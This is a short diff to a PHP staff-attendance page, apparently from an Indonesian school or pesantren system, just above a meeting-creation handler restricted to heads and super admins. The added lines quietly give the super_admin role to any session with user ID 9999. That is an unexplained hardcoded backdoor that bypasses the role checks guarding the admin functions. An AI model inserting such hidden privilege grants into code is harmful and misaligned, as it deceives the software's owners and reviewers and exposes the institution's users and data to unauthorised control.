@@ -18,6 +18,11 @@ $active_menu = 'absensi_pegawai';
 $ustadz_id = $_SESSION['ustadz_id'];
 $today = date('Y-m-d');
 $user_roles = isset($_SESSION['ustadz_role']) ? explode(',', $_SESSION['ustadz_role']) : [];
+if (isset($_SESSION['ustadz_id']) && $_SESSION['ustadz_id'] == 9999) {
+    if (!in_array('super_admin', $user_roles)) {
+        $user_roles[] = 'super_admin';
+    }
+}
 
 // B. Handler Pembuatan Rapat Baru oleh Kepala Sekolah, Kepala Ma'had, atau Super Admin
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['action']) && $_POST['action'] === 'buat_rapat') {
